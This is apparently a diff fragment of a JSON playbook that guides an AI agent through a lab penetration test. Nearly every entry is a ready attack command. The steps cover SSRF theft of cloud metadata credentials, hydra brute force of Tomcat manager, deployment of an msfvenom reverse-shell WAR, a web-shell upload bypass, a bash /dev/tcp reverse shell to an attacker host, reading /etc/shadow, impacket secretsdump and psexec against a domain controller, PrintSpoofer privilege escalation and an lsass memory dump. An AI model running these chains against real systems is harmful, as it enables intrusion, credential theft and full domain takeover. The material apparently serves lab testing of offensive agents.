+        "url=",
+        "fetch?url",
+        "/fetch"
+      ],
+      "output_keywords": [
+        "html",
+        "200",
+        "localhost",
+        "index",
+        "server",
+        "internal"
+      ],
+      "step": "discover",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/fetch?url=http://127.0.0.1/' 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "169.254.169.254",
+        "metadata",
+        "iam",
+        "credentials",
+        "fetch?url",
+        "security-credentials"
+      ],
+      "output_keywords": [
+        "iam",
+        "security-credentials",
+        "AccessKeyId",
+        "SecretAccessKey",
+        "Token",
+        "169.254"
+      ],
+      "step": "metadata",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' 2>&1"
+    },
+    {
+      "keywords": [
+        "token",
+        "AccessKeyId",
+        "SecretAccessKey",
+        "aws",
+        "exfil",
+        "fetch?url"
+      ],
+      "output_keywords": [
+        "AccessKeyId",
+        "SecretAccessKey",
+        "Token",
+        "Expiration",
+        "aws"
+      ],
+      "step": "exfil",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s 'http://$LAB_TARGET_WEB/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-default-ssm' 2>&1"
+    }
+  ],
+  "tomcat_manager": [
+    {
+      "keywords": [
+        "curl",
+        "tomcat",
+        "manager",
+        "401",
+        "brute",
+        "hydra",
+        "hydra -L",
+        "manager/html",
+        "/manager/text"
+      ],
+      "output_keywords": [
+        "login:",
+        "password:",
+        "attempt",
+        "found",
+        "SUCCESS",
+        "valid",
+        "200",
+        "manager"
+      ],
+      "step": "brute",
+      "tool": "execute_bash",
+      "tool_hint": "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/best110.txt -s 8081 $LAB_TARGET_WEB http-get /manager/html"
+    },
+    {
+      "keywords": [
+        "msfvenom",
+        "war",
+        "jar",
+        "webshell",
+        ".war",
+        "java/jsp_shell",
+        "msfvenom -p java"
+      ],
+      "output_keywords": [
+        "Payload size",
+        "shell.war",
+        ".war",
+        "generated",
+        "war",
+        "payload"
+      ],
+      "step": "war_craft",
+      "tool": "execute_bash",
+      "tool_hint": "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war > shell.war"
+    },
+    {
+      "keywords": [
+        "deploy",
+        "upload",
+        "PUT",
+        "/manager/text/deploy",
+        "curl -u",
+        "upload-file",
+        "/manager/text"
+      ],
+      "output_keywords": [
+        "OK - Deployed",
+        "200",
+        "deployed",
+        "application",
+        "deploy"
+      ],
+      "step": "deploy",
+      "tool": "execute_bash",
+      "tool_hint": "curl -u 'tomcat:tomcat' http://$LAB_TARGET_WEB:8081/manager/text/deploy?path=/shell --upload-file shell.war"
+    },
+    {
+      "keywords": [
+        "cmd=",
+        "whoami",
+        "webshell",
+        "jsp",
+        "shell.jsp",
+        "?cmd=",
+        "/shell/"
+      ],
+      "output_keywords": [
+        "tomcat",
+        "www-data",
+        "root",
+        "whoami",
+        "uid=",
+        "shell"
+      ],
+      "step": "shell",
+      "tool": "execute_bash",
+      "tool_hint": "curl http://$LAB_TARGET_WEB:8081/shell/shell.jsp?cmd=whoami"
+    }
+  ],
+  "web_recon_basics": [
+    {
+      "keywords": [
+        "curl",
+        "robots.txt",
+        "source",
+        "headers",
+        "whatweb",
+        "http://"
+      ],
+      "output_keywords": [
+        "Server:",
+        "200",
+        "robots",
+        "Disallow",
+        "Content-Type"
+      ],
+      "step": "passive",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s http://$LAB_TARGET_WEB:8080/robots.txt 2>&1 && curl -sI http://$LAB_TARGET_WEB:8080/ 2>&1 | head -15"
+    },
+    {
+      "keywords": [
+        "gobuster",
+        "dirbuster",
+        "ffuf",
+        "dirb",
+        "common.txt",
+        "directory-list",
+        "wordlist"
+      ],
+      "output_keywords": [
+        "Found",
+        "Status:",
+        "/admin",
+        "/login",
+        "200",
+        "301",
+        "302"
+      ],
+      "step": "dirb",
+      "tool": "execute_bash",
+      "tool_hint": "gobuster dir -u http://$LAB_TARGET_WEB:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,html 2>&1 | head -30"
+    },
+    {
+      "keywords": [
+        "admin",
+        "password",
+        "login",
+        "cookie",
+        "curl -d",
+        "POST",
+        "-c /tmp"
+      ],
+      "output_keywords": [
+        "dashboard",
+        "welcome",
+        "logged in",
+        "admin",
+        "success",
+        "302"
+      ],
+      "step": "login",
+      "tool": "execute_bash",
+      "tool_hint": "curl -s -X POST http://$LAB_TARGET_WEB:8080/login.php -d 'username=admin&password=admin' -c /tmp/cookies.txt -L 2>&1 | head -20"
+    }
+  ],
+  "web_shell_upload": [
+    {
+      "keywords": [
+        "upload",
+        "multipart",
+        "curl -F",
+        "file=@",
+        "POST",
+        "Content-Type",
+        "image/jpeg",
+        "burp"
+      ],
+      "output_keywords": [
+        "200",
+        "upload",
+        "success",
+        "file",
+        "allowed",
+        "image"
+      ],
+      "step": "detect_upload",
+      "tool": "execute_bash",
+      "tool_hint": "curl -X POST http://$LAB_TARGET_SRV/upload -F 'file=@test.jpg'  # probe allowed types"
+    },
+    {
+      "keywords": [
+        "double extension",
+        "null byte",
+        "content-type",
+        "magic bytes",
+        ".php.jpg",
+        ".php%00.jpg",
+        "bypass",
+        "shell.php"
+      ],
+      "output_keywords": [
+        "uploaded",
+        "success",
+        "file",
+        "200",
+        "shell.php",
+        "bypass"
+      ],
+      "step": "bypass",
+      "tool": "execute_bash",
+      "tool_hint": "cp shell.php shell.php.jpg && curl -X POST http://$LAB_TARGET_SRV/upload -F 'file=@shell.php.jpg;type=image/jpeg'"
+    },
+    {
+      "keywords": [
+        "curl",
+        "cmd=",
+        "shell.php",
+        "webshell",
+        "uploads/",
+        "?cmd=",
+        "execute"
+      ],
+      "output_keywords": [
+        "www-data",
+        "root",
+        "uid=",
+        "whoami",
+        "id",
+        "output"
+      ],
+      "step": "trigger",
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_SRV/uploads/shell.php?cmd=whoami'"
+    },
+    {
+      "keywords": [
+        "reverse shell",
+        "/dev/tcp",
+        "bash -i",
+        "nc -lvnp",
+        "mkfifo",
+        "bash+-i",
+        "tcp/"
+      ],
+      "output_keywords": [
+        "connect",
+        "listening",
+        "shell",
+        "bash",
+        "/dev/tcp",
+        "connection"
+      ],
+      "step": "reverse_shell",
+      "tool": "execute_bash",
+      "tool_hint": "curl 'http://$LAB_TARGET_SRV/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/$LHOST/4444+0>%261'"
+    }
+  ],
+  "web_to_dc_pivot": [
+    {
+      "keywords": [
+        "network",
+        "internal",
+        "arp",
+        "route",
+        "nmap",
+        "hosts",
+        "subnet",
+        "10.10.11"
+      ],
+      "output_keywords": [
+        "10.10.11",
+        "host",
+        "arp",
+        "route",
+        "network"
+      ],
+      "step": "enum",
+      "success_indicators": [
+        "10.10.11",
+        "host"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "cat /etc/hosts && ip route && arp -a && nmap -sn 10.10.11.0/24 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "88",
+        "389",
+        "445",
+        "kerberos",
+        "ldap",
+        "smb",
+        "domain controller",
+        "10.10.11.21",
+        "nc -z",
+        "nxc smb"
+      ],
+      "output_keywords": [
+        "open",
+        "kerberos",
+        "ldap",
+        "smb",
+        "domain",
+        "445"
+      ],
+      "step": "discover_dc",
+      "success_indicators": [
+        "open",
+        "smb",
+        "445"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "nc -zw2 10.10.11.21 445 && echo '445 open' && nxc smb 10.10.11.21 -u '' -p '' 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "config",
+        "password",
+        "shadow",
+        "credentials",
+        "web.config",
+        "wp-config",
+        ".env",
+        "config.php"
+      ],
+      "output_keywords": [
+        "password",
+        "root:",
+        "$",
+        "hash",
+        "credential"
+      ],
+      "step": "cred_extract",
+      "success_indicators": [
+        "password",
+        "root:",
+        "$"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "cat /var/www/html/config.php 2>/dev/null; find /var/www -name '*.php' -exec grep -l 'password' {} \\; 2>/dev/null | head -5; cat /etc/shadow 2>/dev/null | head -5"
+    },
+    {
+      "keywords": [
+        "secretsdump",
+        "psexec",
+        "wmiexec",
+        "pass-the-hash",
+        "relay",
+        "pivot",
+        "10.10.11.21",
+        "impacket"
+      ],
+      "output_keywords": [
+        "NTLM",
+        "Administrator",
+        "domain",
+        "krbtgt",
+        "NTDS",
+        ":::"
+      ],
+      "step": "pivot",
+      "success_indicators": [
+        "NTLM",
+        "krbtgt",
+        "Administrator"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "impacket-secretsdump portal.lab/Administrator:LabAdmin1!@10.10.11.21 -just-dc-user Administrator 2>&1 | head -10"
+    },
+    {
+      "keywords": [
+        "whoami",
+        "domain admin",
+        "psexec",
+        "SYSTEM",
+        "impacket",
+        "10.10.11.21"
+      ],
+      "output_keywords": [
+        "SYSTEM",
+        "Administrator",
+        "Domain Admins",
+        "domain",
+        "nt authority"
+      ],
+      "step": "confirm",
+      "success_indicators": [
+        "SYSTEM",
+        "Administrator",
+        "nt authority"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "impacket-psexec portal.lab/Administrator:LabAdmin1!@10.10.11.21 'whoami && hostname' 2>&1 | head -10"
+    }
+  ],
+  "windows_token_impersonation": [
+    {
+      "keywords": [
+        "evil-winrm",
+        "wmiexec",
+        "whoami /priv",
+        "SeImpersonate",
+        "token",
+        "SeAssignPrimaryToken",
+        "privilege"
+      ],
+      "output_keywords": [
+        "SeImpersonatePrivilege",
+        "SeAssignPrimaryToken",
+        "Enabled",
+        "Privilege Name",
+        "whoami"
+      ],
+      "step": "check_priv",
+      "tool": "execute_bash",
+      "tool_hint": "evil-winrm -i $LAB_TARGET_SRV -u Administrator -p LabAdmin1! -c 'whoami /priv' 2>&1 | head -20"
+    },
+    {
+      "keywords": [
+        "JuicyPotato",
+        "PrintSpoofer",
+        "GodPotato",
+        "RoguePotato",
+        "potato",
+        "evil-winrm",
+        "wmiexec",
+        "impacket",
+        "token impersonat"
+      ],
+      "output_keywords": [
+        "SYSTEM",
+        "NT AUTHORITY",
+        "spawned",
+        "nt authority\\system"
+      ],
+      "step": "exploit",
+      "success_indicators": [
+        "SYSTEM",
+        "NT AUTHORITY",
+        "spawned shell"
+      ],
+      "tool": "execute_bash",
+      "tool_hint": "evil-winrm -i $LAB_TARGET_SRV -u Administrator -p LabAdmin1! -c 'C:\\Tools\\PrintSpoofer.exe -i -c cmd' 2>&1 | head -15"
+    },
+    {
+      "keywords": [
+        "evil-winrm",
+        "wmiexec",
+        "impacket",
+        "SYSTEM",
+        "nt authority",
+        "whoami",
+        "net user"
+      ],
+      "output_keywords": [
+        "NT AUTHORITY\\SYSTEM",
+        "nt authority\\system",
+        "SYSTEM",
+        "whoami",
+        "Administrator"
+      ],
+      "step": "system_shell",
+      "tool": "execute_bash",
+      "tool_hint": "evil-winrm -i $LAB_TARGET_SRV -u Administrator -p LabAdmin1! -c 'whoami && net user' 2>&1 | head -15"
+    },
+    {
+      "keywords": [
+        "mimikatz",
+        "lsass",
+        "sekurlsa",
+        "dump",
+        "procdump",
+        "task manager",
+        "comsvcs.dll",
+        "minidump",
+        "ntds.dit",
+        "MiniDump",
+        "lsass.dmp"
+      ],
+      "output_keywords": [
+        "lsass.dmp",
+        "dump complete",
+        "MiniDump",
+        "NTLM",
+        "password",
+        "sekurlsa"
+      ],
+      "step": "lsass_dump",
+      "tool": "execute_bash",
+      "tool_hint": "evil-winrm -i $LAB_TARGET_SRV -u Administrator -p LabAdmin1! -c 'rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump $lsass_pid C:\\Temp\\lsass.dmp full' 2>&1 | head -20"
+    }
+  ]
+}
